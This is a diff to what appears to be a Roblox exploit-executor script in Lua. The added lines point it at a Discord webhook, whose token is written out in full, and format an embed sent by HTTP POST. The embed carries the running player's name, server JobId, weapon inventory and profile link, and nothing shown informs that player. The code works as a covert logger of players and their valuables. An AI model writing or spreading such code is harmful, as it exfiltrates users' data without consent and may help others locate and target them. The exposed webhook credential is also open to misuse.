@@ -136,7 +136,7 @@ antiafk = false
 end
 end)
 
-local url = "https://webhook.site/7b2ec9f2-551d-4708-9d07-7e9f716a20cb"
+local url = "https://discord.com/api/webhooks/1296489854061903894/WU2SIziNuj1qUPFKbz5hYKKrFqV0n6jv_xWhUrACj3OJMtHCH7zoFISKoUcg60H_ma_O"
    
 t = {}
 for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
@@ -147,13 +147,16 @@ inventory = table.concat(t)
 local data = {
 		["embeds"] = {
 					{
-						["Profile"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
+						["title"] =  game.JobId,
+						["description"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
+						["type"] = "rich",
+						["color"]= tonumber(0xff0000),
 						["footer"] = {
 							["icon_url"] = 'https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096',
 							["text"] = ""
 						},
-						["Jobid"] = {
-							["url"] = game.JobId,
+						["thumbnail"] = {
+							["url"] = "https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096",
 						},
 						["author"] = {
 							["name"] = ""
@@ -161,7 +164,7 @@ local data = {
 						["fields"] = {
 							{
 								["name"] = '**Player profile**',
-								["profile"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+								["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
 								["inline"] = true
 							},
 						}
@@ -174,7 +177,6 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-
 
 Player = game.Players.LocalPlayer
 Pl = game.Players
